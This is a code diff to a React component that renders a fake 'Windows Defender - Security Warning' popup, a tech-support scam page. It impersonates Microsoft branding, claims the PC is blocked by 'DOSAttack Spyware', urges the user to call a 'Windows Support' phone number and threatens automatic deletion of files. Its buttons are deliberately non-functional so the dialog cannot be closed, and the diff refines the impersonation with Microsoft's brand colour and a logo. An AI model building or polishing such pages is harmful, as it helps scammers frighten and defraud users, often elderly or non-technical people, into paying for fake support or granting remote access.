@@ -4,6 +4,7 @@ import { AlertDialog, AlertDialogContent } from "@/components/ui/alert-dialog";
 import { Shield, ShieldAlert, X } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Sheet, SheetContent } from "@/components/ui/sheet";
+import { Dialog, DialogContent } from "@/components/ui/dialog";
 
 const BlockingPopup = () => {
   const [open, setOpen] = useState(false);
@@ -60,10 +61,9 @@ const BlockingPopup = () => {
       <AlertDialog open={open} onOpenChange={() => {}}>
         <AlertDialogContent 
           className="p-0 border-0 max-w-xl"
-          onPointerDownOutside={(e) => e.preventDefault()}
         >
           {/* Blue header */}
-          <div className="bg-[#0066cc] text-white p-4">
+          <div className="bg-[#0078D4] text-white p-4">
             <h2 className="text-xl font-bold mb-1">Windows Defender - Security Warning</h2>
             <p className="text-sm font-bold">** ACCESS TO THIS PC HAS BEEN BLOCKED FOR SECURITY REASONS **</p>
           </div>
@@ -71,11 +71,11 @@ const BlockingPopup = () => {
           <div className="p-5 pb-2">
             <div className="flex items-center gap-3 mb-4">
               <img 
-                src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0OCA0OCI+PHBhdGggZmlsbD0iIzAwNzhkNCIgZD0iTTI0IDRDMTIuOTU0IDQgNCA1Ljc4MSA0IDUuNzgxdjE5LjAgNS4wYzAgMS42NTcgMC45MDggMy4xODcgMi40MjIgNGwxNS4wIDguMTI1YzEuNjU0IDAuODk1IDMuNjQ4IDAuODc2IDUuMjg3IC0wLjAyNzQ0YzAuMDA5MDMgLTAuMDA1MDcgMC4wMTc5NyAtMC4wMTAzIDAuMDI3MzQgLTAuMDE1NjJsMTIuODQgLTcuMjI0NmMxLjUyNCAtMC44NTYxIDIuNDI0IC0yLjQ0NiAyLjQyNCAtNC4xNzE5di01LjAgLTE4Ljg5NGMtMCAwaC0xOC4weiBtMCAyLjIxODhjOC45OSAwIDE1Ljc4MSAxLjc4MTMgMTUuNzgxIDEuNzgxM3YxNy44NDRjLTAgMCAtNS42NzQgMS42MDYxIC0xNS43ODEgMS42MDYxcy0xNS43ODEgLTEuNjA2IC0xNS43ODEgLTEuNjA2di0xNy44NDRzNi43MzcgLTEuNzgxMyAxNS43ODEgLTEuNzgxM3ptLTQuMjE4OCA3LjIxODhjLTAuNzU4NSAwLjAxIC0xLjQ2MyAwLjQyMSAtMS44NDM4IDEuMDkzOGwtNi43NSAxMi4wYy0wLjI2NTUgMC40NjIgLTAuMjcwNiAxLjAyOSAtMC4wMTM3MSAxLjQ5NjFjMC4yNTY5IDAuNDY3IDAuNzQ0NSAwLjc1NyAxLjI3NzQgMC43NjE3aDkuMEMxNi4zMTQgMjguOTc2IDE2LjI2IDI4LjM3MSAxNi40MDYgMjcuODA1bDEuNDk5OSAtNS45OTk5YzAuMTExOSAtMC40NDkgMC4yMjQxIC0xLjMxMiAwLjIyNDEgLTEuNjI1YzAgLTEuMTc2IC0wLjczODUgLTIuMDkwIC0xLjgxMjUgLTIuNjI1IC0wLjE4MjQgLTAuMDkyIC0wLjM4MTcgLTAuMTM2IC0wLjU4MjEgLTAuMTI1aC0wLjE4OTVjLTAuMDQ0MyAtMC4wMDIgLTAuMDg4NyAtMC4wMDMgLTAuMTMzIDAuMDA3OEwxMC41OTM4IDE4LjI1Yy0wLjMxMDggMC4wNzEgLTAuNTcwNiAwLjI4NCAtMC43MDEyIDAuNTc0MmMtMC4xMzA3IDAuMjkgLTAuMTAzIDAuNjI3IDAuMDc0MiAwLjg5MjZsMy4wNjI0IDQuNjg3NGMwLjI1NzEgMC4zOTQgMC42OTE5IDAuNjI4IDEuMTU3IDAuNjI2aDguMDYyNWwtMS43MTg3IDYuODc1Yy0wLjEyOTYgMC41MjIgMC4wMjk0IDEuMDcxIDAuNDE5OSAxLjQ0NTNjMC4zOTA1IDAuMzc0IDAuOTQ0NCAwLjUxIDEuNDU1MSAwLjM1OTRsMy4wOTM4IC0wLjkwNjNjMC4yNDk1IC0wLjA3NCAwLjQ2NTUgLTAuMjMzIDAuNjA5NCAtMC40NTNsMTEuMTg4IC0xNy4wMDFjMC4xNzI2IC0wLjI2MyAwLjIxNDMgLTAuNTkxIDAuMTEzMyAtMC44OTA2Yy0wLjEwMSAtMC4yOTkgLTAuMzQwOSAtMC41MzEgLTAuNjQyNiAtMC42MjVsLTMuMzc1IC0xLjEyNDljLTAuMzgyIC0wLjEyOCAtMC44MDI3IC0wLjAzNiAtMS4wOTM4IDAuMjM4MmwtNi4xMjUgNS42ODc1bC04Ljc1IC00LjkzNzVjLTAuMjQ4IC0wLjE0IC0wLjUzIC0wLjIwOSAtMC44MTMgLTAuMTk5em0tMC41MzEyIDZoMS41YzAuODQ0MSAwIDEuNjI1IDAuMDkzOCAxLjYyNSAwLjA5MzhzMC4yNDk5IDEuMDMxMiAwLjI0OTkgMi4wMzEyYzAgMC4xOTYgLTAuMDA1IDAuMzkyIC0wLjAxMTcgMC41NjI1aC04LjE3NThjLTAuMDI3NiAwLjAgMCAtMC4wOTM4IDAgLTAuMDkzOGwzLjU2MjUgLTIuNWMwLjI4MTEgLTAuMDQ2IDAuODU3MiAtMC4wOTM4IDEuMjUgLTAuMDkzOHoiLz48L3N2Zz4=" 
+                src="/lovable-uploads/40d57122-9014-430f-a2f5-7aeb904ad3fa.png" 
                 alt="Microsoft Logo" 
-                className="w-6 h-6" 
+                className="w-10 h-10" 
               />
-              <span className="font-bold">Microsoft</span>
+              <span className="font-bold text-lg">Microsoft</span>
             </div>
             
             <p className="mb-4">
@@ -97,7 +97,7 @@ const BlockingPopup = () => {
                 More Details
               </Button>
               <Button 
-                className="bg-[#0066cc] hover:bg-[#0052a3]"
+                className="bg-[#0078D4] hover:bg-[#006cc1] text-white"
                 onClick={() => {/* Cannot close dialog */}}
               >
                 Activate License
@@ -107,76 +107,79 @@ const BlockingPopup = () => {
         </AlertDialogContent>
       </AlertDialog>
 
-      {/* Details sheet */}
-      <Sheet open={showDetails && open} onOpenChange={() => setShowDetails(false)}>
-        <SheetContent className="w-full sm:max-w-md" onPointerDownOutside={(e) => e.preventDefault()}>
-          <div className="flex items-center space-x-2 mb-4 text-blue-800">
-            <Shield className="h-6 w-6" />
-            <h2 className="text-lg font-semibold">Windows Defender Security Center</h2>
+      {/* Details dialog */}
+      <Dialog open={showDetails && open} onOpenChange={(open) => setShowDetails(open)}>
+        <DialogContent className="sm:max-w-md p-0 gap-0 overflow-hidden">
+          <div className="flex items-center justify-between p-4 border-b">
+            <div className="flex items-center space-x-2">
+              <Shield className="h-6 w-6 text-[#0078D4]" />
+              <h2 className="text-lg font-semibold text-[#0078D4]">Windows Defender Security Center</h2>
+            </div>
             <button 
-              className="ml-auto text-gray-500 hover:text-gray-700"
+              className="text-gray-500 hover:text-gray-700"
               onClick={() => setShowDetails(false)}
             >
               <X className="h-5 w-5" />
             </button>
           </div>
 
-          <div className="text-center mb-5 text-red-600">
-            <p className="font-semibold">App: Ads.fancetracks(2).dll</p>
-            <p className="font-semibold">Threat Detected: DOSAttack Spyware</p>
-          </div>
+          <div className="p-6">
+            <div className="text-center mb-5">
+              <p className="font-semibold text-red-600">App: Ads.fancetracks(2).dll</p>
+              <p className="font-semibold text-red-600">Threat Detected: DOSAttack Spyware</p>
+            </div>
 
-          <div className="grid grid-cols-3 gap-2 max-w-sm mx-auto mb-6">
-            <div className="border rounded-md p-2 flex flex-col items-center">
-              <div className="w-10 h-10 bg-gray-200 rounded-full flex items-center justify-center mb-1">
-                <Shield className="h-5 w-5 text-gray-600" />
+            <div className="flex justify-center mb-6">
+              <div className="grid grid-cols-3 gap-4 max-w-sm">
+                <div className="flex flex-col items-center">
+                  <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0OCA0OCI+PHBhdGggZmlsbD0iIzAwNzhkNCIgZD0iTTI0IDRDMTIuOTU0IDQgNCA1Ljc4MSA0IDUuNzgxdjE5LjAgNS4wYzAgMS42NTcgMC45MDggMy4xODcgMi40MjIgNGwxNS4wIDguMTI1YzEuNjU0IDAuODk1IDMuNjQ4IDAuODc2IDUuMjg3IC0wLjAyNzQ0YzAuMDA5MDMgLTAuMDA1MDcgMC4wMTc5NyAtMC4wMTAzIDAuMDI3MzQgLTAuMDE1NjJsMTIuODQgLTcuMjI0NmMxLjUyNCAtMC44NTYxIDIuNDI0IC0yLjQ0NiAyLjQyNCAtNC4xNzE5di01LjAgLTE4Ljg5NGMtMCAwaC0xOC4weiBtMCAyLjIxODhjOC45OSAwIDE1Ljc4MSAxLjc4MTMgMTUuNzgxIDEuNzgxM3YxNy44NDRjLTAgMCAtNS42NzQgMS42MDYxIC0xNS43ODEgMS42MDYxcy0xNS43ODEgLTEuNjA2IC0xNS43ODEgLTEuNjA2di0xNy44NDRzNi43MzcgLTEuNzgxMyAxNS43ODEgLTEuNzgxM3ptLTQuMjE4OCA3LjIxODhjLTAuNzU4NSAwLjAxIC0xLjQ2MyAwLjQyMSAtMS44NDM4IDEuMDkzOGwtNi43NSAxMi4wYy0wLjI2NTUgMC40NjIgLTAuMjcwNiAxLjAyOSAtMC4wMTM3MSAxLjQ5NjFjMC4yNTY5IDAuNDY3IDAuNzQ0NSAwLjc1NyAxLjI3NzQgMC43NjE3aDkuMEMxNi4zMTQgMjguOTc2IDE2LjI2IDI4LjM3MSAxNi40MDYgMjcuODA1bDEuNDk5OSAtNS45OTk5YzAuMTExOSAtMC40NDkgMC4yMjQxIC0xLjMxMiAwLjIyNDEgLTEuNjI1YzAgLTEuMTc2IC0wLjczODUgLTIuMDkwIC0xLjgxMjUgLTIuNjI1IC0wLjE4MjQgLTAuMDkyIC0wLjM4MTcgLTAuMTM2IC0wLjU4MjEgLTAuMTI1aC0wLjE4OTVjLTAuMDQ0MyAtMC4wMDIgLTAuMDg4NyAtMC4wMDMgLTAuMTMzIDAuMDA3OEwxMC41OTM4IDE4LjI1Yy0wLjMxMDggMC4wNzEgLTAuNTcwNiAwLjI4NCAtMC43MDEyIDAuNTc0MmMtMC4xMzA3IDAuMjkgLTAuMTAzIDAuNjI3IDAuMDc0MiAwLjg5MjZsMy4wNjI0IDQuNjg3NGMwLjI1NzEgMC4zOTQgMC42OTE5IDAuNjI4IDEuMTU3IDAuNjI2aDguMDYyNWwtMS43MTg3IDYuODc1Yy0wLjEyOTYgMC41MjIgMC4wMjk0IDEuMDcxIDAuNDE5OSAxLjQ0NTNjMC4zOTA1IDAuMzc0IDAuOTQ0NCAwLjUxIDEuNDU1MSAwLjM1OTRsMy4wOTM4IC0wLjkwNjNjMC4yNDk1IC0wLjA3NCAwLjQ2NTUgLTAuMjMzIDAuNjA5NCAtMC40NTNsMTEuMTg4IC0xNy4wMDFjMC4xNzI2IC0wLjI2MyAwLjIxNDMgLTAuNTkxIDAuMTEzMyAtMC44OTA2Yy0wLjEwMSAtMC4yOTkgLTAuMzQwOSAtMC41MzEgLTAuNjQyNiAtMC42MjVsLTMuMzc1IC0xLjEyNDljLTAuMzgyIC0wLjEyOCAtMC44MDI3IC0wLjAzNiAtMS4wOTM4IDAuMjM4MmwtNi4xMjUgNS42ODc1bC04Ljc1IC00LjkzNzVjLTAuMjQ4IC0wLjE0IC0wLjUzIC0wLjIwOSAtMC44MTMgLTAuMTk5em0tMC41MzEyIDZoMS41YzAuODQ0MSAwIDEuNjI1IDAuMDkzOCAxLjYyNSAwLjA5MzhzMC4yNDk5IDEuMDMxMiAwLjI0OTkgMi4wMzEyYzAgMC4xOTYgLTAuMDA1IDAuMzkyIC0wLjAxMTcgMC41NjI1aC04LjE3NThjLTAuMDI3NiAwLjAgMCAtMC4wOTM4IDAgLTAuMDkzOGwzLjU2MjUgLTIuNWMwLjI4MTEgLTAuMDQ2IDAuODU3MiAtMC4wOTM4IDEuMjUgLTAuMDkzOHoiLz48L3N2Zz4=" 
+                    alt="Scan Icon" className="w-12 h-12" />
+                  <span className="text-xs mt-1">Scan</span>
+                </div>
+                <div className="flex flex-col items-center">
+                  <img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz48c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkxheWVyXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4IiB2aWV3Qm94PSIwIDAgNDggNDgiIHN0eWxlPSJlbmFibGUtYmFja2dyb3VuZDpuZXcgMCAwIDQ4IDQ4OyIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+PHN0eWxlIHR5cGU9InRleHQvY3NzIj4uc3Qwe2ZpbGw6IzAwNzhENDt9PC9zdHlsZT48cGF0aCBjbGFzcz0ic3QwIiBkPSJNMjQsNGMtMTEsMC0yMCwxLjgtMjAsMS44djE5djVjMCwxLjcsMC45LDMuMiwyLjQsNGwxNSw4LjFjMS43LDAuOSwzLjYsMC45LDUuMywwYzAsMCwwLDAsMCwwbDEyLjgtNy4yYzEuNS0wLjksMi40LTIuNCwyLjQtNC4ydi01VjUuOEMyNCw0LDI0LDQsMjQsNHogTTI0LDYuMmM5LDAsMTUuOCwxLjgsMTUuOCwxLjh2MTcuOGMwLDAtNS43LDEuNi0xNS44LDEuNlM4LjIsMjUuOCw4LjIsMjUuOFY4QzguMiw4LDE1LDYuMiwyNCw2LjJ6IE0zNi45LDEzLjhjLTAuNCwwLjEtMC43LDAuNS0wLjYsMC45YzAsMC4xLDAsMC4xLDAsMC4yYzAsMC40LDAuMywwLjcsMC43LDAuN2MwLDAsMCwwLDAsMGgwLjFjMC40LTAuMSwwLjctMC41LDAuNy0wLjljMC0wLjQtMC40LTAuNy0wLjgtMC43QzM3LDEzLjgsMzYuOSwxMy44LDM2LjksMTMuOHogTTM0LjcsMTQuN2MtMC4xLDAtMC4zLDAtMC40LDAuMUwzMywxNS41bC0wLjEsMC4xYy0wLjMsMC4zLTAuMywwLjcsMCwxYzAuMywwLjMsMC43LDAuMywxLDBsMC4xLTAuMWwxLjItMC44YzAuNC0wLjIsMC41LTAuNywwLjMtMUMzNS4zLDE0LjgsMzUsMTQuNywzNC43LDE0Ljd6IE0yOS41LDE2LjdsLTEuNywwLjhoLTAuMWMtMC40LDAuMi0wLjUsMC43LTAuMywxYzAuMiwwLjQsMC43LDAuNSwxLDAuM2wwLjEtMC4xbDEuOC0wLjljMC40LTAuMiwwLjUtMC42LDAuMy0xQzMwLjQsMTYuNiwyOS45LDE2LjQsMjkuNSwxNi43TDI5LjUsMTYuN3ogTTIzLjcsMThoLTEuOGMtMC40LDAtMC44LDAuMy0wLjgsMC44YzAsMC40LDAuMywwLjgsMC44LDAuOGgxLjhjMC40LDAsMC44LTAuMywwLjgtMC44QzI0LjUsMTguMywyNC4yLDE4LDIzLjcsMTh6IE0xOC4yLDE4LjFjLTAuNCwwLTAuNywwLjItMC44LDAuNWMtMC4xLDAuNC0wLjEsMC44LDAuMywxbDEuOCwxLjFjMC40LDAuMiwwLjgsMC4xLDEuMS0wLjJjMC4yLTAuNCwwLjEtMC44LTAuMi0xLjFsLTEuOC0xLjFDMTguNSwxOC4yLDE4LjMsMTguMSwxOC4yLDE4LjF6IE0xMywxOS43Yy0wLjIsMC0wLjUsMC4xLTAuNiwwLjNsLTEuMywxLjdsMCwwYy0wLjMsMC4zLTAuMiwwLjgsMC4xLDEuMWMwLjMsMC4zLDAuOCwwLjIsMS4xLTAuMWwwLDBsMS4zLTEuN2MwLjMtMC4zLDAuMi0wLjgsMC0xLjFDMTMuNCwxOS44LDEzLjIsMTkuNywxMywxOS43TDEzLDE5Ljd6IE05LjcsMjIuOGMtMC4xLTAuNC0wLjUtMC42LTAuOS0wLjVjLTAuMSwwLTAuMiwwLjEtMC4zLDAuMWMtMC40LDAuMi0wLjUsMC43LTAuMywxLjFjMC4yLDAuNCwwLjcsMC41LDEuMSwwLjNjMC40LTAuMiwwLjUtMC42LDAuMy0xQzkuNywyMi45LDkuNywyMi44LDkuNywyMi44eiBNMzcuNywxNi43Yy0wLjEsMC0wLjIsMC0wLjIsMEgzNWMtMC40LDAtMC43LDAuMy0wLjcsMC43YzAsMC40LDAuMywwLjcsMC43LDAuN2gyLjVjMC40LDAsMC43LTAuMywwLjctMC43QzM4LjUsMTcsMzguMSwxNi43LDM3LjcsMTYuN3ogTTM3LjgsMjBjLTAuMSwwLTAuMiwwLTAuMiwwLjFsLTIuMiwxLjJjLTAuNCwwLjItMC41LDAuNi0wLjMsMWMwLjIsMC40LDAuNiwwLjUsMSwwLjNsMCwwbDIuMi0xLjJjMC40LTAuMiwwLjUtMC42LDAuMy0xQzM4LjMsMjAuMSwzOC4xLDIwLDM3LjgsMjB6IE0zNC4xLDIzLjljLTAuMSwwLTAuMywwLTAuNCwwLjFsLTEuOSwxLjljLTAuMywwLjMtMC4zLDAuNywwLDFjMC4zLDAuMywwLjcsMC4zLDEsMGwxLjktMS45YzAuMywwLDAuNi0wLjQsMC4zLTAuN0MzNC43LDI0LDM0LjQsMjMuOSwzNC4xLDIzLjl6IE0xNS41LDI3LjJsMS41LTYuMWMwLjMtMS4zLDAuOC0xLjcsMC44LTEuN2MxLjQsMCwyLjEsMC43LDIuMSwwLjdjMCwwLjEsMC4xLDAuNiwwLDEuNmwtMS41LDUuOWMtMC4xLDAuNSwwLjIsMS4xLDAuNywxLjNjMC41LDAuMiwxLjEsMCwxLjMtMC41bDAuMS0wLjNsMS42LTYuNGMwLjMtMS4yLDAuMS0yLjItMC41LTNjLTAuNi0wLjgtMS40LTEuMi0yLjctMS4yaC0wLjZjLTAuOCwwLTEuMiwwLjEtMS45LDAuNWMtMS42LDAuOS0yLjEsMi43LTIuNCwzLjlsLTEuNiw2LjFjLTAuMSwwLjUsMC4yLDEuMSwwLjcsMS4zYzAuNSwwLjIsMS4xLDAsMS4zLTAuNUMxMy43LDI5LjQsMTUuNSwyNy4yLDE1LjUsMjcuMnogTTI5LjksMjguMWMwLjIsMC40LDAuMSwwLjktMC4zLDEuMmwtMS43LDEuMmMtMC40LDAuMy0wLjksMC4yLTEuMi0wLjJzLTAuMi0wLjksMC4yLTEuMmwxLjctMS4yQzI5LjEsMjcuNiwyOS43LDI3LjcsMjkuOSwyOC4xeiBNMzIuNSwyNy42Yy0wLjcsMi0yLjMsMy41LTQuNyw0LjRjLTAuNSwwLjItMC44LTAuMS0wLjYtMC42YzEuNC0zLjQsNC0zLjMsNC4zLTUuOGMwLjMtMi4zLDEuMi0xLjksMi4xLTAuN0MzNC4yLDI1LjksMzIuOSwyNi41LDMyLjUsMjcuNnogTTIzLjUsMzIuNGMzLjQsMCw3LjQtMS40LDcuNC0zLjRjMC0xLjItMi41LTEuNy0zLjItMS43Yy0yLjMsMC03LDMuMS03LDMuMUMyMC43LDMxLjUsMjEuNywzMi40LDIzLjUsMzIuNHogTTIzLjYsMjcuMmw0LjYtMy40bC00LjYtMi42bC00LjYsMi42TDIzLjYsMjcuMnoiLz48L3N2Zz4=" 
+                    alt="Security Icon" className="w-12 h-12" />
+                  <span className="text-xs mt-1">Security</span>
+                </div>
+                <div className="flex flex-col items-center">
+                  <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0OCA0OCI+PHBhdGggZmlsbD0iIzAwNzhkNCIgZD0iTTI0IDRDMTIuOTU0IDQgNCA1Ljc4MSA0IDUuNzgxdjE5LjAgNS4wYzAgMS42NTcgMC45MDggMy4xODcgMi40MjIgNGwxNS4wIDguMTI1YzEuNjU0IDAuODk1IDMuNjQ4IDAuODc2IDUuMjg3IC0wLjAyNzQ0YzAuMDA5MDMgLTAuMDA1MDcgMC4wMTc5NyAtMC4wMTAzIDAuMDI3MzQgLTAuMDE1NjJsMTIuODQgLTcuMjI0NmMxLjUyNCAtMC44NTYxIDIuNDI0IC0yLjQ0NiAyLjQyNCAtNC4xNzE5di01LjAgLTE4Ljg5NGMtMCAwaC0xOC4weiBtMCAyLjIxODhjOC45OSAwIDE1Ljc4MSAxLjc4MTMgMTUuNzgxIDEuNzgxM3YxNy44NDRjLTAgMCAtNS42NzQgMS42MDYxIC0xNS43ODEgMS42MDYxcy0xNS43ODEgLTEuNjA2IC0xNS43ODEgLTEuNjA2di0xNy44NDRzNi43MzcgLTEuNzgxMyAxNS43ODEgLTEuNzgxM3pNMTIgMTN2Nmg2di0yaC00di00ek0zMCAxM3Y0aC00djJoNnYtNnpNMTIgMjl2NGg0djJoLTZ2LTZ6TTMwIDI5djZoLTZ2LTJoNHYtNHoiLz48L3N2Zz4=" 
+                    alt="Settings Icon" className="w-12 h-12" />
+                  <span className="text-xs mt-1">Settings</span>
+                </div>
               </div>
-              <span className="text-xs">Scan</span>
             </div>
-            <div className="border rounded-md p-2 flex flex-col items-center">
-              <div className="w-10 h-10 bg-gray-200 rounded-full flex items-center justify-center mb-1">
-                <ShieldAlert className="h-5 w-5 text-gray-600" />
-              </div>
-              <span className="text-xs">Security</span>
-            </div>
-            <div className="border rounded-md p-2 flex flex-col items-center">
-              <div className="w-10 h-10 bg-gray-200 rounded-full flex items-center justify-center mb-1">
-                <Shield className="h-5 w-5 text-gray-600" />
-              </div>
-              <span className="text-xs">Settings</span>
-            </div>
-          </div>
 
-          <div className="text-center mb-6">
-            <h3 className="text-lg font-bold text-blue-800 mb-2">
-              Access to this PC has been blocked for security reasons.
-            </h3>
-            <p className="text-blue-700 font-semibold">
-              Contact Windows Support: 1-865-484-6972 (Toll Free)
+            <div className="text-center mb-6">
+              <h3 className="text-lg font-bold text-[#0078D4] mb-2">
+                Access to this PC has been blocked for security reasons.
+              </h3>
+              <p className="text-[#0078D4] font-semibold">
+                Contact Windows Support: 1-865-484-6972 (Toll Free)
+              </p>
+            </div>
+
+            <p className="text-sm text-gray-600 mb-6">
+              Note: If you think this notification is by error, report immediately to Windows Support to halt the auto-deletion of files and applications from this computer. As this computer ID is flagged and is connected over the Internet Servers, files and apps deletion may start any moment.
             </p>
-          </div>
 
-          <p className="text-sm text-gray-600 mb-6">
-            Note: If you think this notification is by error, report immediately to Windows Support to halt the auto-deletion of files and applications from this computer. As this computer ID is flagged and is connected over the Internet Servers, files and apps deletion may start any moment.
-          </p>
-
-          <div className="flex justify-center gap-4">
-            <Button 
-              variant="outline" 
-              className="w-24 border-gray-300" 
-              onClick={() => {/* Cannot close dialog */}}
-            >
-              Deny
-            </Button>
-            <Button 
-              className="w-24 bg-blue-600 hover:bg-blue-700"
-              onClick={() => {/* Cannot close dialog */}}
-            >
-              Allow
-            </Button>
+            <div className="flex justify-center gap-4">
+              <Button 
+                variant="outline" 
+                className="w-24 border-gray-300" 
+                onClick={() => {/* Cannot close dialog */}}
+              >
+                Deny
+              </Button>
+              <Button 
+                className="w-24 bg-[#0078D4] hover:bg-[#006cc1]"
+                onClick={() => {/* Cannot close dialog */}}
+              >
+                Allow
+              </Button>
+            </div>
           </div>
-        </SheetContent>
-      </Sheet>
+        </DialogContent>
+      </Dialog>
     </>
   );
 };
